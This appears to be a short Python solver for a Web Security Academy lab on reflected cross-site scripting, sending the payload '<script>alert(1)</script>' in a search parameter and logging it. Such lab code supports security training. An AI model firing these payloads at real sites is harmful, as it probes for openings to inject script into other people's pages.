from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<script>alert(1)</script>"

    session.get_path("/", params={"search": xss})
    logger.info("Searched the following payload:")
    logger.info(xss)
